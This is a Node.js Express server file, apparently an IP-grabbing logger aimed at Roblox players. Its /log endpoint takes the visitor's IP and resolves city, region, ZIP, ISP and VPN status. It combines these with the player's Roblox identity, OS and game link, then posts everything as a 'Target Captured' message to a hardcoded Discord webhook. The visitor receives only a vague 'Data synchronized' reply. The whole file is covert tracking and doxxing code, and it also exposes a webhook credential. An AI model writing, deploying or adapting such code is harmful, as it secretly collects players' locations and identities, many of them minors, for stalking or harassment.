const express = require('express');
const axios = require('axios');
const app = express();

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

const cache = new Map();

async function getGeo(ip) {
    try {
        const res = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}?fields=status,message,country,regionName,city,zip,isp,org,mobile,proxy,hosting`);
        return res.data;
    } catch { return { status: 'fail' }; }
}

app.get('/log', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    const { userId, name, display, placeId, job, os } = req.query;

    if (cache.has(userId) && (Date.now() - cache.get(userId) < 300000)) {
        return res.json({ status: "skipped", reason: "rate_limited" });
    }
    cache.set(userId, Date.now());

    const geo = await getGeo(ip);
    const avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    const embed = {
        username: "Roblox Intelligence System",
        avatar_url: "https://i.imgur.com/W9vS0Zp.png",
        embeds: [{
            title: "🎯 Target Captured: " + (name || "Unknown"),
            url: `https://www.roblox.com/users/${userId}/profile`,
            color: geo.proxy || geo.hosting ? 16711680 : 3447003,
            thumbnail: { url: avatar },
            fields: [
                { name: "👤 Identity", value: `**User:** ${name}\n**Display:** ${display}\n**ID:** \`${userId}\``, inline: true },
                { name: "🌐 Network", value: `**IP:** \`${ip}\`\n**ISP:** ${geo.isp || "N/A"}\n**VPN/Proxy:** ${geo.proxy ? "⚠️ YES" : "✅ NO"}`, inline: true },
                { name: "📍 Location", value: `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip || "???"})`, inline: false },
                { name: "💻 Device Info", value: `**OS:** ${os || "Unknown"}\n**Job:** \`${job ? job.slice(-10) : "N/A"}\``, inline: true },
                { name: "🎮 Game", value: `[Join Game](https://www.roblox.com/games/${placeId})`, inline: true }
            ],
            footer: { text: `Captured at ${new Date().toLocaleString()}` }
        }]
    };

    try {
        await axios.post(WEBHOOK_URL, embed);
        console.log(`✅ Logged: ${name} [${ip}]`);
    } catch (e) {
        console.error("❌ Webhook Error");
    }

    res.json({ success: true, message: "Data synchronized." });
});

app.listen(process.env.PORT || 3000, () => console.log('🚀 Ultimate Logger Online'));
